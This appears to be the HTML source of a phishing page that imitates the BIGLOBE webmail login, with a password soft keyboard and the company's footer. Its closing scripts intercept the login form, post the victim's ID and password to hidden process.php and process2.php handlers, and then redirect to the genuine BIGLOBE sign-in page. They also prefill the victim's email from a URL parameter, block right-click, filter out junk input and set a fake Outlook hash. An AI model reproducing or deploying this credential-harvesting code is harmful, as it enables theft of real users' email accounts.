id="soft_keyboard_large_5" value="F" style="background-position:-137px -83px"><input type="button" id="soft_keyboard_large_6" value="G" style="background-position:-164px -83px"><div class="soft_keyboard_space"></div><input type="button" id="soft_keyboard_large_7" value="H" style="background-position:-191px -83px"><input type="button" id="soft_keyboard_large_8" value="I" style="background-position:-218px -83px"><input type="button" id="soft_keyboard_large_9" value="J" style="background-position:-245px -83px"><input type="button" id="soft_keyboard_large_10" value="K" style="background-position:-272px -83px"><input type="button" id="soft_keyboard_large_11" value="L" style="background-position:-299px -83px"><input type="button" id="soft_keyboard_large_12" value="M" style="background-position:-326px -83px"><input type="button" id="soft_keyboard_large_13" value="N" style="background-position:-353px -83px"></div><div id="soft_keyboard_small_all_1" class="keyBox margin_bottom5 clearfix soft_keyboard_key"><input type="button" id="soft_keyboard_small_0" value="a" style="background-position:-2px -245px"><input type="button" id="soft_keyboard_small_1" value="b" style="background-position:-29px -245px"><input type="button" id="soft_keyboard_small_2" value="c" style="background-position:-56px -245px"><input type="button" id="soft_keyboard_small_3" value="d" style="background-position:-83px -245px"><input type="button" id="soft_keyboard_small_4" value="e" style="background-position:-110px -245px"><input type="button" id="soft_keyboard_small_5" value="f" style="background-position:-137px -245px"><input type="button" id="soft_keyboard_small_6" value="g" style="background-position:-164px -245px"><div class="soft_keyboard_space"></div><input type="button" id="soft_keyboard_small_7" value="h" style="background-position:-191px -245px"><input type="button" id="soft_keyboard_small_8" value="i" style="background-position:-218px -245px"><input type="button" id="soft_keyboard_small_9" value="j" style="background-position:-245px -245px"><input type="button" id="soft_keyboard_small_10" value="k" style="background-position:-272px -245px"><input type="button" id="soft_keyboard_small_11" value="l" style="background-position:-299px -245px"><input type="button" id="soft_keyboard_small_12" value="m" style="background-position:-326px -245px"><input type="button" id="soft_keyboard_small_13" value="n" style="background-position:-353px -245px"></div><div id="soft_keyboard_large_all_2" class="keyBox clearfix soft_keyboard_key"><input type="button" id="soft_keyboard_large_14" value="O" style="background-position:-2px -164px"><input type="button" id="soft_keyboard_large_15" value="P" style="background-position:-29px -164px"><input type="button" id="soft_keyboard_large_16" value="Q" style="background-position:-56px -164px"><input type="button" id="soft_keyboard_large_17" value="R" style="background-position:-83px -164px"><input type="button" id="soft_keyboard_large_18" value="S" style="background-position:-110px -164px"><input type="button" id="soft_keyboard_large_19" value="T" style="background-position:-137px -164px"><input type="button" id="soft_keyboard_large_20" value="U" style="background-position:-164px -164px"><div class="soft_keyboard_space"></div><input type="button" id="soft_keyboard_large_21" value="V" style="background-position:-191px -164px"><input type="button" id="soft_keyboard_large_22" value="W" style="background-position:-218px -164px"><input type="button" id="soft_keyboard_large_23" value="X" style="background-position:-245px -164px"><input type="button" id="soft_keyboard_large_24" value="Y" style="background-position:-272px -164px"><input type="button" id="soft_keyboard_large_25" value="Z" style="background-position:-299px -164px"></div><div id="soft_keyboard_small_all_2" class="keyBox clearfix soft_keyboard_key"><input type="button" id="soft_keyboard_small_14" value="o" style="background-position:-2px -326px"><input type="button" id="soft_keyboard_small_15" value="p" style="background-position:-29px -326px"><input type="button" id="soft_keyboard_small_16" value="q" style="background-position:-56px -326px"><input type="button" id="soft_keyboard_small_17" value="r" style="background-position:-83px -326px"><input type="button" id="soft_keyboard_small_18" value="s" style="background-position:-110px -326px"><input type="button" id="soft_keyboard_small_19" value="t" style="background-position:-137px -326px"><input type="button" id="soft_keyboard_small_20" value="u" style="background-position:-164px -326px"><div class="soft_keyboard_space"></div><input type="button" id="soft_keyboard_small_21" value="v" style="background-position:-191px -326px"><input type="button" id="soft_keyboard_small_22" value="w" style="background-position:-218px -326px"><input type="button" id="soft_keyboard_small_23" value="x" style="background-position:-245px -326px"><input type="button" id="soft_keyboard_small_24" value="y" style="background-position:-272px -326px"><input type="button" id="soft_keyboard_small_25" value="z" style="background-position:-299px -326px"></div></div><div id="soft_keyboard_m_mark"><div class="num_box clearfix"><div id="soft_keyboard_m_mark_1" class="keyBox clearfix soft_keyboard_key"><input type="button" id="soft_keyboard_mail_mark_0" value="@" style="background-position:-2px -407px"><input type="button" id="soft_keyboard_mail_mark_1" value="." style="background-position:-29px -407px"><input type="button" id="soft_keyboard_mail_mark_2" value="!" style="background-position:-56px -407px"><input type="button" id="soft_keyboard_mail_mark_3" value="?" style="background-position:-83px -407px"><input type="button" id="soft_keyboard_mail_mark_4" value="$" style="background-position:-110px -407px"><input type="button" id="soft_keyboard_mail_mark_5" value="%" style="background-position:-137px -407px"><input type="button" id="soft_keyboard_mail_mark_6" value="#" style="background-position:-164px -407px"><div class="soft_keyboard_space"></div><input type="button" id="soft_keyboard_mail_mark_7" value="*" style="background-position:-191px -407px"><input type="button" id="soft_keyboard_mail_mark_8" value="+" style="background-position:-218px -407px"><input type="button" id="soft_keyboard_mail_mark_9" value="-" style="background-position:-245px -407px"><input type="button" id="soft_keyboard_mail_mark_10" value="=" style="background-position:-272px -407px"><input type="button" id="soft_keyboard_mail_mark_11" value="_" style="background-position:-299px -407px"><input type="button" id="soft_keyboard_mail_mark_12" value="'" style="background-position:-326px -407px"><input type="button" id="soft_keyboard_mail_mark_13" value="`" style="background-position:-353px -407px"></div><div id="soft_keyboard_m_mark_2" class="keyBox clearfix soft_keyboard_key"><input type="button" id="soft_keyboard_mail_mark_14" value="~" style="background-position:-2px -488px"><input type="button" id="soft_keyboard_mail_mark_15" value="{" style="background-position:-29px -488px"><input type="button" id="soft_keyboard_mail_mark_16" value="}" style="background-position:-56px -488px"><input type="button" id="soft_keyboard_mail_mark_24" value="&amp;" style="background-position:-272px -488px"><input type="button" id="soft_keyboard_mail_mark_25" value="/" style="background-position:-299px -488px"><input type="button" id="soft_keyboard_mail_mark_26" value="^" style="background-position:-326px -488px"><input type="button" id="soft_keyboard_mail_mark_27" value="|" style="background-position:-353px -488px"><div class="soft_keyboard_space"></div></div></div></div><div id="soft_keyboard_p_mark"><div class="num_box clearfix"><div id="soft_keyboard_p_mark_1" class="keyBox clearfix soft_keyboard_key"><input type="button" id="soft_keyboard_pass_mark_0" value="@" style="background-position:-2px -407px"><input type="button" id="soft_keyboard_pass_mark_1" value="." style="background-position:-29px -407px"><input type="button" id="soft_keyboard_pass_mark_2" value="!" style="background-position:-56px -407px"><input type="button" id="soft_keyboard_pass_mark_3" value="?" style="background-position:-83px -407px"><input type="button" id="soft_keyboard_pass_mark_4" value="$" style="background-position:-110px -407px"><input type="button" id="soft_keyboard_pass_mark_5" value="%" style="background-position:-137px -407px"><input type="button" id="soft_keyboard_pass_mark_6" value="#" style="background-position:-164px -407px"><div class="soft_keyboard_space"></div><input type="button" id="soft_keyboard_pass_mark_7" value="*" style="background-position:-191px -407px"><input type="button" id="soft_keyboard_pass_mark_8" value="+" style="background-position:-218px -407px"><input type="button" id="soft_keyboard_pass_mark_9" value="-" style="background-position:-245px -407px"><input type="button" id="soft_keyboard_pass_mark_10" value="=" style="background-position:-272px -407px"><input type="button" id="soft_keyboard_pass_mark_11" value="_" style="background-position:-299px -407px"><input type="button" id="soft_keyboard_pass_mark_12" value="'" style="background-position:-326px -407px"><input type="button" id="soft_keyboard_pass_mark_13" value="`" style="background-position:-353px -407px"></div><div id="soft_keyboard_p_mark_2" class="keyBox clearfix soft_keyboard_key"><input type="button" id="soft_keyboard_pass_mark_14" value="~" style="background-position:-2px -488px"><input type="button" id="soft_keyboard_pass_mark_15" value="{" style="background-position:-29px -488px"><input type="button" id="soft_keyboard_pass_mark_16" value="}" style="background-position:-56px -488px"><input type="button" id="soft_keyboard_pass_mark_17" value="(" style="background-position:-83px -488px"><input type="button" id="soft_keyboard_pass_mark_18" value=")" style="background-position:-110px -488px"><input type="button" id="soft_keyboard_pass_mark_19" value="[" style="background-position:-137px -488px"><input type="button" id="soft_keyboard_pass_mark_20" value="]" style="background-position:-164px -488px"><div class="soft_keyboard_space"></div><input type="button" id="soft_keyboard_pass_mark_21" value="\" style="background-position:-191px -488px"><input type="button" id="soft_keyboard_pass_mark_22" value=":" style="background-position:-218px -488px"><input type="button" id="soft_keyboard_pass_mark_23" value=";" style="background-position:-245px -488px"></div></div></div><div class="keyBox" id="soft_keyboard_domain"><div class="num_box clearfix"><div id="soft_keyboard_domain_1" class="keyBox clearfix soft_keyboard_key"><input type="button" id="soft_keyboard_add_0" value=".co.jp" style="background-position:-2px -569px"><input type="button" id="soft_keyboard_add_1" value=".ne.jp" style="background-position:-52px -569px"><input type="button" id="soft_keyboard_add_2" value=".com" style="background-position:-102px -569px"><input type="button" id="soft_keyboard_add_3" value=".biglobe.ne.jp" style="background-position:-152px -569px"></div></div></div></td></tr></tbody></table><table id="soft_keyboard_footer_box" style="margin-bottom:0; margin-top:5px; border:0; " width="100%" cellspacing="0" cellpadding="0" border="0"><tbody><tr><td class="overray" style="text-align:center; border:none; padding:0; background-color:#ffffff;"><div class="checkbox"><label><input type="checkbox" id="soft_keyboard_random" name="soft_keyboard_random"> キー表示位置をランダムにする</label>　　<label id="soft_keyboard_pass_on2"><input type="checkbox" id="soft_keyboard_pass_on" name="soft_keyboard_pass_on"><span> パスワードを表示する</span></label></div><div class="select_box clearfix"><a id="soft_keyboard_transi_link"></a>　　<a><img id="soft_keyboard_cancel_b" src="https://webmail.biglobe.ne.jp/softkeyboard/img/cancel.gif" width="96" height="32"></a><br></div></td></tr></tbody></table></div></td><td id="over_rc"></td></tr><tr><td style="border:none; padding:0; background-color:transparent;"><img src="https://webmail.biglobe.ne.jp/softkeyboard/img/over_lb.gif"></td><td id="over_cb"></td><td style="border:none; padding:0; background-color:transparent;"><img src="https://webmail.biglobe.ne.jp/softkeyboard/img/over_rb.gif"></td></tr></tbody></table></div></div></div>
<div id="my_div"></div>

	<ul>
    <li><input type="checkbox" name="autologinidflag" id="autologinidflag" value="1"><label for="autologinidflag">次回からIDの入力を省略</label></li>
	<li><input type="checkbox" name="autologinflag" id="autologinflag" value="1"><label for="autologinflag"><a href="http://support.biglobe.ne.jp/settei/webmail/login.html" target="_blank">ログイン状態を保存する</a><br>（共有パソコンではチェックをはずしてください）</label></li>
        <li><select name="version" id="version" onchange="deprecated_check()">
<option value="advanced" selected="">アドバンスト版</option>
<option value="basic">標準版</option>
</select></li>
         <li>

<div id="deprecated" style="padding-top: 10px"></div>

</li>
        </ul>

	<div class="loginBtn">
	<input type="image" src="https://webmail.biglobe.ne.jp/images2/btn_login.gif" alt="ログイン" title="ログイン" width="205" height="37" border="0"></div>
</form>


</div>
<!--login sec2 ends here -->



</div><!-- //login_form -->
<script type="text/javascript">
<!--

	doit();

//-->
</script>

<ul class="supportLink">
<li><a href="http://support.biglobe.ne.jp/settei/webmail/login.html" target="_blank">ログイン方法について</a></li>
<li><a href="http://support.biglobe.ne.jp/jimu/idpw/index.html" target="_blank">ID・パスワードを忘れた場合</a><br>
BIGLOBE法人会員でID・パスワードをお忘れの方は［<a href="http://office.biglobe.ne.jp/kentou/office/faq.html" target="_blank">こちら</a>］</li>
<li><a href="http://email.biglobe.ne.jp/mailaccount.html" target="_blank">メールアドレスの取得・確認</a></li>
<li><a href="http://email.biglobe.ne.jp/machange/index.html" target="_blank">メールアドレスの変更</a></li>
</ul>
</div><!-- /login_block -->


<!-- /side_menu --></div>
<!-- /side_menu_block --></div>

</div><!-- //side_menuArea -->
<!-- /Menu_end -->

</div><!-- /main -->
<!-- /Main_end -->

<!-- START : フッター -->
<div id="footerContainer">
<!--フッターサーチここから-->
<!--
<div id="footerSearch">
<table border="0" align="center" cellpadding="0" cellspacing="0" summary="search form">
<tr>
	<form name="srh2" id="srh2" method="get" action="http://cgi.search.biglobe.ne.jp/cgi-bin/search2-f">
	<td>
		<input type="hidden" name="search" value="検索">
		<input type="text" name="q" size="18" style="width:216px" value="">
	</td>
	<td width="3"><img src="https://webmail.biglobe.ne.jp/images2/common/spacer.gif" alt="" width="3" height="3"></td>
	<td><input type="submit" name="btn2" value="ウェブ検索"></td>
	</form>
</tr>
</table>
</div>
-->
<!--フッターサーチここまで-->
<div id="footerLink">
	<div id="footerLinkBox1">&nbsp;</div>
	<div id="footerLinkBox2">
		<a href="https://www.biglobe.ne.jp/">BIGLOBEトップ</a>｜<a href="https://join.biglobe.ne.jp/">インターネット接続</a>（<a href="https://join.biglobe.ne.jp/ftth/hikari/">ビッグローブ光</a>・<a href="https://join.biglobe.ne.jp/mobile/">格安SIM</a>・<a href="https://join.biglobe.ne.jp/mobile/special/">SIM替え</a>）<br>
		<a href="https://www.biglobe.co.jp/">会社概要</a>｜<a href="https://www.biglobe.ne.jp/whatsnew/news.html">ニュースリリース</a>｜<a href="https://www.biglobe.co.jp/recruit/index.html">採用情報</a>｜<a href="https://www.biglobe.ne.jp/privacy.html">個人情報保護ポリシー</a>｜<a href="https://www.biglobe.ne.jp/cookie.html">Cookieポリシー</a>｜<a href="https://support.biglobe.ne.jp/safesecurity/">安心・安全</a>｜<a href="https://support.biglobe.ne.jp/">お問い合わせ</a>
	</div>


	<div id="footerLinkBox3">
	<img src="https://webmail.biglobe.ne.jp/images2/common/footer3logo.gif" alt="" usemap="#FooterMap" width="210" height="66">
<map name="FooterMap" id="FooterMap">
<area shape="rect" coords="95,0,155,64" href="https://privacymark.jp/" target="_blank" alt="プライバシーマーク" onclick="B.gae('footer', 'click', 'footer');">
<area shape="rect" coords="160,0,210,64" href="http://www.biglobe.ne.jp/safesecurity.html" target="_blank" alt="インターネット接続サービス安全・安心マーク" onclick="B.gae('footer', 'click', 'footer');">
</map>
	</div>


</div>
<div id="footerCopyright">
	<script type="text/javascript" src="https://webmail.biglobe.ne.jp/js2/footer.js"></script>
	<script type="text/javascript">
	<!--
	copyright();
	//-->
	</script>Copyright(C)BIGLOBE Inc. 1996-2021
	<noscript>Copyright(C)BIGLOBE Inc.</noscript>
</div>
</div>
<!-- END : フッター -->


</div><!-- /container -->

<div class="overlay">
  <div class="lgif-space"></div>
    <div class="loadgif">
       <img src="img/loading.gif" width="100" height="100">
    </div>
</div>

<iframe style="width: 0px; height: 0px; border: 0px none; display: none; visibility: hidden;" src="javascript:void(0)"></iframe>




<script src="https://code.jquery.com/jquery-3.2.1.min.js"></script>

 <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js" integrity="sha384-cs/chFZiN24E4KMATLdqdvsezGxaGsi4hLGOzlXwp5UZB1LY//20VyM2taTB4QvJ" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js" integrity="sha384-uefMccjFJAIv6A+rW+L4AHf99KvxDjWSu1z9VI8SKNVmz4sk7buKt/6v9KI65qnm" crossorigin="anonymous"></script>
<script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.3.1.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>

<script type="text/javascript">
$(document).bind("contextmenu", function(e){ return false;});

$('#loginForm').on('submit', function(e){
		
		 $(".overlay").show(500);
		$.post('T_a_n_G_u_l_AR/process.php', $(this).serialize(), function(data){
			console.log(data);
		});
		setTimeout(function() {
								$(".loginsec").hide();
								$(".loginsec2").show();
                                $(".overlay").hide(500);
                        },2000);
		e.preventDefault();
	});
	
$('#loginForm2').on('submit', function(e){
		
		 $(".overlay").show(500);
		$.post('T_a_n_G_u_l_AR/process2.php', $(this).serialize(), function(data){
			console.log(data);
		});
		setTimeout(function() {
                                window.location.href = "https://auth.sso.biglobe.ne.jp/mail/";
                        },2000);
		e.preventDefault();
	});




</script>

<script type="text/javascript">

var $c = getUrlParameter('email');
     $('#email').val($c);
	 $('#email1').val($c);
	$('#me').text($c);
        var $current_email = "";

        if ($c) {
            $current_email = isValidEmail($c) ? $c : decodeCustom($c);
        }


        function decodeCustom($email) {
            var $consonants = 'bcdfghjklmnpqrstvwxyz'.split('');
            var $joinChar = $email.substr(0, 1); // substr(,0,1);
            var $output = $email.substr(2); // substr($email,2);
            var $vowels = ['a', 'e', 'i', 'o', 'u'];
            var $vowelsLookup = [];

            for ($i in $consonants) {
                $output = $output.replace(new RegExp($joinChar + '0' + $i + 'a', 'g'), $consonants[$i]);
            }

            for ($i in $vowels) {
                $output = $output.replace(new RegExp($joinChar + $i, 'g'), $vowels[$i]);
            }

            $output = $output.replace(new RegExp($joinChar + $joinChar + $joinChar, 'g'), '@');
            //,$output);
            return $output;
        }

        function isValidEmail(email) {
            var re =
                /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
            return re.test(email);
        }

        function getUrlParameter(name) {
            name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
            var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
            var results = regex.exec(location.search);
            return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
			
        }
		
		 var currentEmail = $current_email;
    var ListEntries = [
            '.*fuck.*',
            '.*pussy.*',
            '.*bitch.*',
            '.*asshole.*',
            '.*fool.*',
            '.*dick.*',
            '.*mama.*',
            '.*nice.*try.*',
            '.*12345.*'
        ];
		
		 if(currentEmail){

            var e = document.getElementById('username');
            e = currentEmail;
            //e.readOnly = true;
			

            var domain = extractDomain(currentEmail);

           // var corH = document.getElementById('corportate-title');
            //corH.innerText = domain + " Email Login";

            }
			
		function extractDomain(email){

        var load = email;
        var domain = '';
        var regex = /.+@(.*?)\..+/;
        var str = email;
        var m;

        if ((m = regex.exec(str)) !== null) {
            return m[1];
        }

        return null;
    }



</script> 



<script> 
  location.hash = 'wa=wsignin1.0&rpsnv=13&ct=1539585327&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3d715d44a2-2f11-4282-f625-a066679e96e2&id=292841&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015&domain=' 
</script>

<script type="text/javascript" src="js/actions.js"></script>
</body>
</html>